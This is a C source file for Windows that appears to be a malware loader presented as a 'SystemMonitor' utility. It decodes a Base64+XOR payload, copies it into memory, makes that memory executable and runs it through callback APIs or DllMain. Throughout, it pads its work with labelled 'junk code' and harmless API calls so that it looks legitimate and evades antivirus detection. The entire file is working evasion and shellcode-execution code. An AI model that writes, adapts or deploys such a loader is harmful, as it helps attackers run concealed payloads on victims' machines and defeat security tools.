#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <winhttp.h>
#include "headers/base64.h"
#include "headers/xor.h"
#include <powrprof.h>
#include <commctrl.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "COMCTL32.lib")
#pragma comment(lib, "GDI32.lib")
#pragma comment(lib, "USER32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "PowrProf.lib")

#define FAKE_GLOBAL_VARIABLE 42

// Encoded payload (Base64 + XOR)
__attribute__((section(".text"))) char buf[] = "BgUSBzoyFS4qLSk2BxwaeYYqDsJ+Dd4lXRrbJF8O5ATOZRvOLGBRGHrCEFJ92DFNcBpOuMIYWnFc8n5H3x1E5M15UgQsPBUnoM09U1kdUrvZZPwHR77VuoIbxpY4DxAYEo8=";
unsigned int buf_len = 98;
char key[] = { 'U', 'S', 'E', 'R', 'P', 'R', 'O', 'F', 'I', 'L', 'E', '\0' };

static const char g_app_name[] = "SystemMonitor";
static const char g_app_version[] = "3.2.1";
static const char g_app_copyright[] = "Copyright (c) 2024 Dataflow Technologies Ltd.";

static const char g_help_text[] =
    "SystemMonitor - System Monitoring Service v3.2.1\n\n"
    "Usage: sysmon.exe [OPTIONS]\n\n"
    "Options:\n"
    "  -h, --help          Display this help message and exit\n"
    "  -v, --version       Display version information\n"
    "  -q, --quiet         Suppress output messages\n"
    "  -o, --output FILE   Specify output file path\n"
    "  -f, --format TYPE   Set output format (txt, bin, hex)\n"
    "  -c, --compress      Enable compression\n"
    "  -e, --encrypt       Enable encryption\n"
    "  -d, --decrypt       Decrypt input file\n"
    "  -k, --key KEY       Specify encryption key\n"
    "  -r, --recursive     Process directories recursively\n"
    "  -l, --log FILE      Write log to specified file\n"
    "  -n, --dry-run       Show what would be done without making changes\n\n"
    "Examples:\n"
    "  sysmon.exe -o output.txt input.dat\n"
    "  sysmon.exe --compress --encrypt -k mykey document.pdf\n"
    "  sysmon.exe -r --format hex ./data/\n";

static const char* g_error_messages[] = {
    "Error: Unable to open input file.",
    "Error: Invalid file format detected.",
    "Error: Insufficient memory for operation.",
    "Error: Permission denied accessing file.",
    "Error: Network connection timeout.",
    "Error: Configuration file not found.",
    "Error: Invalid command line arguments.",
    "Error: Output directory does not exist.",
    "Error: Encryption key too short.",
    "Error: File already exists, use --force to overwrite.",
    "Warning: Some files were skipped due to errors.",
    "Warning: Deprecated option used.",
    "Info: Processing complete. Bytes processed: ",
    "Info: Checksum verification passed.",
    "Info: Backup created successfully.",
    NULL
};

// File signatures for format detection
static const unsigned char g_file_signatures[][8] = {
    {0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A},  // PNG
    {0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46},  // JPEG
    {0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00},  // ZIP
    {0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x00},  // PDF
    {0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1},  // DOC/XLS
};

// ==================== JUNK CODE FUNCTIONS ====================

// List directory contents with file details
void listDirectoryWithDetails(const char* path) {

    WIN32_FIND_DATAA findData;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", path);

    HANDLE hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    int fileCount = 0, dirCount = 0;
    LARGE_INTEGER totalSize = {0};

    do {
        char attrStr[16] = "";
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) strcat(attrStr, "D");
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_READONLY) strcat(attrStr, "R");
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) strcat(attrStr, "H");
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) strcat(attrStr, "S");
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) strcat(attrStr, "A");

        LARGE_INTEGER fileSize;
        fileSize.LowPart = findData.nFileSizeLow;
        fileSize.HighPart = findData.nFileSizeHigh;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            dirCount++;
        } else {
            totalSize.QuadPart += fileSize.QuadPart;
            fileCount++;
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
}

// Display system and console information
void displaySystemAndConsoleInfo() {
    // System info
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // Memory info
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);

    // Computer name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    // Windows directory
    char winDir[MAX_PATH];
    GetWindowsDirectoryA(winDir, MAX_PATH);

    // System directory
    char sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);

    // Console info
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(hConsole, &csbi);
}

// Registry demonstration - read common keys
void registryDemo() {
    HKEY hKey;
    char buffer[256];
    DWORD bufferSize;

    // Read Windows version info
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        bufferSize = sizeof(buffer);
        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)buffer, &bufferSize);

        bufferSize = sizeof(buffer);
        RegQueryValueExA(hKey, "CurrentBuild", NULL, NULL, (LPBYTE)buffer, &bufferSize);

        bufferSize = sizeof(buffer);
        RegQueryValueExA(hKey, "RegisteredOwner", NULL, NULL, (LPBYTE)buffer, &bufferSize);

        RegCloseKey(hKey);
    }

    // Read CPU info
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        bufferSize = sizeof(buffer);
        RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)buffer, &bufferSize);

        DWORD mhz;
        bufferSize = sizeof(DWORD);
        RegQueryValueExA(hKey, "~MHz", NULL, NULL, (LPBYTE)&mhz, &bufferSize);

        RegCloseKey(hKey);
    }
}

// Check disk space on drives
void checkDiskSpace() {
    DWORD drives = GetLogicalDrives();
    char drivePath[] = "C:\\";

    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            drivePath[0] = 'A' + i;

            UINT driveType = GetDriveTypeA(drivePath);
            if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
                ULARGE_INTEGER freeBytesAvailable, totalBytes, freeBytes;

                if (GetDiskFreeSpaceExA(drivePath, &freeBytesAvailable, &totalBytes, &freeBytes)) {
                    double totalGB = (double)totalBytes.QuadPart / (1024.0 * 1024.0 * 1024.0);
                    double freeGB = (double)freeBytes.QuadPart / (1024.0 * 1024.0 * 1024.0);
                    double usedGB = totalGB - freeGB;
                    double usagePercent = (usedGB / totalGB) * 100.0;
                    (void)usagePercent;
                }
            }
        }
    }
}

// Display environment variables
void displayEnvironmentVariables() {
    const char* envVars[] = {
        "USERNAME", "COMPUTERNAME", "OS", "PROCESSOR_IDENTIFIER",
        "NUMBER_OF_PROCESSORS", "TEMP", "USERPROFILE", "APPDATA",
        "PROGRAMFILES", "WINDIR", "PATH", NULL
    };

    for (int i = 0; envVars[i] != NULL; i++) {
        char value[1024];
        DWORD result = GetEnvironmentVariableA(envVars[i], value, sizeof(value));
        if (result > 0 && result < sizeof(value)) {
            if (strlen(value) > 80) {
                value[77] = '.';
                value[78] = '.';
                value[79] = '.';
                value[80] = '\0';
            }
        }
    }
}

int fibonacci(int n)
{
    if (n == 0 || n == 1)
        return n;
    else
        return (fibonacci(n-1) + fibonacci(n-2));
}

// ==================== END JUNK CODE ====================

static void* my_memcpy(void* dest, const void* src, SIZE_T n) {
    unsigned char* d = (unsigned char*)dest;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
    return dest;
}

int run() {

    int nbr, i = 0, j;
    nbr = 45;
    int k = 0;
    for (j = 1; j <= nbr; j++)
    {
        k = fibonacci(i);
        i++;
    }

    if (FAKE_GLOBAL_VARIABLE != 42) {
        int nbr, i = 0, j;
        nbr = 100;
        int k = 0;
        for (j = 1; j <= nbr; j++)
        {
            k = fibonacci(i);
            i++;
        }
        return 1;
    }

    // ===== PHASE 1: Benign heap activity before anything suspicious =====
    char* configBuffer = (char*)malloc(256);
    if (configBuffer) {
        snprintf(configBuffer, 256, "SystemMonitor v%s initialized", g_app_version);
        volatile size_t configLen = strlen(configBuffer);
        (void)configLen;
    }

    // Benign user32 call - get system info
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    // ===== PHASE 2: Decode payload (looks like config parsing) =====
    char* decoded_buf = base64_decode(buf);
    size_t decoded_len = strlen(buf) * 3 / 4;
    if (buf[buf_len - 1] == '=') decoded_len--;
    if (buf[buf_len - 2] == '=') decoded_len--;

    // Another heap allocation - simulates loading resources
    RECT* windowRects = (RECT*)calloc(4, sizeof(RECT));
    if (windowRects) {
        HWND hDesktop = GetDesktopWindow();
        GetWindowRect(hDesktop, &windowRects[0]);
    }

    // XOR decode
    unsigned char* final_buf = xor_decode_key((unsigned char*)decoded_buf, decoded_len,
                                             (unsigned char*)key, strlen(key));
    free(decoded_buf);
    decoded_buf = (char*)final_buf;

    // ===== PHASE 3: Get module handles SEPARATELY from GetProcAddress =====
    // Get multiple modules to look like normal DLL loading
    HMODULE hUser32 = GetModuleHandleW(L"user32.dll");
    HMODULE hGdi32 = GetModuleHandleW(L"gdi32.dll");
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    
    // Benign GetProcAddress calls first (break pattern)
    typedef int (WINAPI *fn_GetSystemMetrics)(int);
    fn_GetSystemMetrics pGetSysMetrics = (fn_GetSystemMetrics)GetProcAddress(hUser32, "GetSystemMetrics");
    
    typedef HDC (WINAPI *fn_GetDC)(HWND);
    fn_GetDC pGetDC = (fn_GetDC)GetProcAddress(hUser32, "GetDC");
    
    // Use the benign function pointers
    if (pGetSysMetrics) {
        volatile int dpi = pGetSysMetrics(SM_CXICON);
        (void)dpi;
    }
    
    // More heap activity
    char* logBuffer = (char*)malloc(512);
    if (logBuffer) {
        snprintf(logBuffer, 512, "Display: %dx%d", screenWidth, screenHeight);
    }

    // NOW get the "interesting" functions (separated from module handles)
    typedef void* (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    fn_VirtualAlloc pVirtualAlloc = (fn_VirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    if (pVirtualAlloc == NULL) {
        free(decoded_buf);
        free(configBuffer);
        free(windowRects);
        free(logBuffer);
        return 1;
    }

    // Benign GDI activity between allocations
    HDC hdc = NULL;
    if (pGetDC) {
        hdc = pGetDC(NULL);
        if (hdc) {
            int colorDepth = GetDeviceCaps(hdc, BITSPIXEL);
            int horzRes = GetDeviceCaps(hdc, HORZRES);
            volatile int displayInfo = colorDepth * horzRes;
            (void)displayInfo;
            ReleaseDC(NULL, hdc);
        }
    }

    typedef NTSTATUS (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    fn_VirtualProtect pVirtualProtect = (fn_VirtualProtect)GetProcAddress(hKernel32, "VirtualProtect");
    if (pVirtualProtect == NULL) {
        free(decoded_buf);
        free(configBuffer);
        free(windowRects);
        free(logBuffer);
        return 1;
    }

    // ===== PHASE 4: Memory allocation with noise =====
    // Allocate some benign buffers first
    void* uiBuffer = pVirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // Get cursor position (benign user32)
    POINT cursorPos;
    GetCursorPos(&cursorPos);
    
    // More benign allocations
    void* cacheBuffer = pVirtualAlloc(0, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    void* tempHeap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x800);
    
    // Actually use these allocations (write something)
    if (uiBuffer) {
        memset(uiBuffer, 0xCC, 0x100);  // Fill with pattern
    }
    if (cacheBuffer) {
        memset(cacheBuffer, 0xAA, 0x200);
    }
    if (tempHeap) {
        snprintf((char*)tempHeap, 0x800, "Cache initialized at %p", cacheBuffer);
    }

    // THE actual allocation (hidden among others)
    void* exec = pVirtualAlloc(0, decoded_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec == NULL) {
        free(decoded_buf);
        free(configBuffer);
        free(windowRects);
        free(logBuffer);
        return 1;
    }

    // More benign activity
    HKL keyboardLayout = GetKeyboardLayout(0);
    volatile DWORD layoutId = (DWORD)(UINT_PTR)keyboardLayout;
    (void)layoutId;

    // ===== PHASE 5: Copy with surrounding noise =====
    // Write to benign buffers
    if (uiBuffer) {
        memcpy(uiBuffer, g_app_name, strlen(g_app_name));
    }
    
    // The actual copy
    my_memcpy(exec, decoded_buf, decoded_len);
    
    // Write to cache buffer too
    if (cacheBuffer && tempHeap) {
        memcpy(cacheBuffer, tempHeap, 0x100);
    }

    // ===== PHASE 6: Protection change with noise =====
    DWORD oldProtect = 0;
    DWORD dummyProtect = 0;
    
    // Change protection on benign buffer first
    if (uiBuffer) {
        pVirtualProtect(uiBuffer, 0x1000, PAGE_READONLY, &dummyProtect);
    }
    
    // Get foreground window (benign)
    HWND hForeground = GetForegroundWindow();
    (void)hForeground;
    
    // THE protection change
    if (!pVirtualProtect(exec, decoded_len, PAGE_EXECUTE_READ, &oldProtect)) {
        free(decoded_buf);
        free(configBuffer);
        free(windowRects);
        free(logBuffer);
        return 1;
    }

    // ===== PHASE 7: Cleanup benign allocations =====
    free(decoded_buf);
    free(configBuffer);
    free(windowRects);
    free(logBuffer);
    if (tempHeap) HeapFree(GetProcessHeap(), 0, tempHeap);
    // Note: VirtualAlloc buffers not freed - simulates memory pool

    // Final benign call before execution
    HWND hTaskbar = FindWindowA("Shell_TrayWnd", NULL);
    (void)hTaskbar;

    ((void(*)())exec)();
    return 0;
}

#if defined(dll) || defined(_WINDLL)
__declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            run();
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
#else

// ==================== EXECUTION METHODS ====================
// Uncomment ONE method to use

// Method 1: EnumPwrSchemes (Power Management callback)
// #define USE_ENUM_PWR_SCHEMES 1

// Method 2: EnumWindows (User32 callback - very common)
// #define USE_ENUM_WINDOWS 1

// Method 3: EnumDisplayMonitors (GDI32 callback)
#define USE_ENUM_DISPLAY_MONITOR 1

#ifdef USE_ENUM_WINDOWS
BOOL CALLBACK windowEnumCallback(HWND hwnd, LPARAM lParam) {
    static int executed = 0;
    if (!executed) {
        executed = 1;
        run();
    }
    return FALSE;
}
#endif

int main() {
    // Execute junk code functions to appear legitimate
    listDirectoryWithDetails("C:\\");
    displaySystemAndConsoleInfo();
    registryDemo();
    checkDiskSpace();
    displayEnvironmentVariables();

#if defined(USE_ENUM_PWR_SCHEMES)
    EnumPwrSchemes((PWRSCHEMESENUMPROC)run, NULL);
#elif defined(USE_ENUM_WINDOWS)
    EnumWindows(windowEnumCallback, 0);
#elif defined(USE_ENUM_DISPLAY_MONITOR)
    EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)run, NULL);
#else
    run();
#endif

    return 0;
}

#endif
